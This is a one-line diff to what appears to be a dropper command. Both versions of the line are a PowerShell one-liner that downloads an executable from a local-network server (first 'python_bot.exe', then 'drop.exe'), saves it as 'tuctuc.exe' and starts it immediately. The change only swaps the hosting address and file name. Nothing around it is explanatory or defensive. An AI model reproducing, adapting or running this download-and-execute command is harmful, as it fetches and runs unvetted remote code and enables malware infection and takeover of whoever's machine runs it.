@@ -1,1 +1,1 @@
-powershell  (New-Object System.Net.WebClient).DownloadFile('http://192.168.5.15:5000/uploads/python_bot.exe','tuctuc.exe');Start-Process 'tuctuc.exe';exit;
+powershell  (New-Object System.Net.WebClient).DownloadFile('http://10.5.5.10:5000/drop.exe','tuctuc.exe');Start-Process 'tuctuc.exe';exit;
